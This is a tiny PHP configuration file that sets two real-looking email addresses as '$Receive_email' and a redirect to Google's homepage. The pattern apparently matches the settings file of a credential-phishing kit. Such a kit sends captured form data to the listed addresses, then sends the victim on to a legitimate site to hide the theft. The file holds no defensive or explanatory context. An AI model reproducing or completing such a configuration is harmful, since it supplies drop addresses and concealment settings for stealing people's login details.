<?php 
$Receive_email="tycoo2019@yandex.com, corey.easyairconditioning@gmail.com";
$redirect="https://www.google.com/";
?>